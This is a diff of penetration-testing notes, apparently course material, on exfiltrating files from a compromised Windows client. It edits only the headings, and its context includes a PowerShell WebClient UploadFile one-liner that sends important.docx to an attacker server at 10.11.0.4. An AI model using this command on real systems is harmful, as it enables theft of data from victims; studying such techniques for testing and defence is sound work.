@@ -1,4 +1,4 @@
-# start here
+## start here
 
 In certain scenarios, we may need to exfiltrate data from a target network using a Windows client.
 This can be complex since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows
@@ -26,6 +26,7 @@ With Apache and the PHP script ready to receive our file, we move to the comprom
 host and invoke the UploadFile method from the System.Net.WebClient class to upload the
 document we want to exfiltrate, in this case, a file named important.docx:
 
+## Upload stuff
 powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
 
 
